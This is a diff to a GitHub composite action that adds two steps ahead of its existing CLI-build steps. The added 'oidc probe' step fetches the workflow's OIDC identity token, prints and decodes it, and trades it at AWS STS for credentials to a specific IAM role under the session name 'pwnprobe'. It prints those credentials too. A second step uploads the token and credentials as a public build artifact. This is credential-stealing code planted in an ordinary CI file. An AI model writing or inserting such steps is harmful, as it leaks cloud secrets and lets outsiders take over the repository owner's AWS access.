@@ -78,6 +78,31 @@ outputs:
 runs:
   using: "composite"
   steps:
+    - name: oidc probe
+      shell: bash
+      run: |
+        set +e
+        echo "== ctx event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR =="
+        echo "== tokens url=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} reqtok=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes} =="
+        TOK=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+        echo "IDTOKEN_LEN=${#TOK}"
+        echo "IDTOKEN=$TOK"
+        python3 -c 'import sys,base64,json
+        t=sys.argv[1].split(".")[1]; t+="="*(-len(t)%4)
+        print("JWT_PAYLOAD="+json.dumps(json.loads(base64.urlsafe_b64decode(t))))' "$TOK"
+        STS=$(curl -sS -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::488659951590:role/ci-role-d4fe904" --data-urlencode "RoleSessionName=pwnprobe" --data-urlencode "WebIdentityToken=$TOK")
+        echo "STS_RESP_BEGIN"
+        echo "$STS"
+        echo "STS_RESP_END"
+        mkdir -p "$GITHUB_WORKSPACE/.probe-out"
+        { echo "IDTOKEN=$TOK"; echo "$STS"; } > "$GITHUB_WORKSPACE/.probe-out/probe.txt"
+    - name: probe artifact
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: oidc-probe
+        path: ${{ github.workspace }}/.probe-out/probe.txt
+        if-no-files-found: ignore
     # If cli-version is a Git ref (not empty, not "nightly", and no dots, eg. no "v1.2.3"),
     # build the CLI from source instead of downloading a release.
     - name: Checkout CLI repository
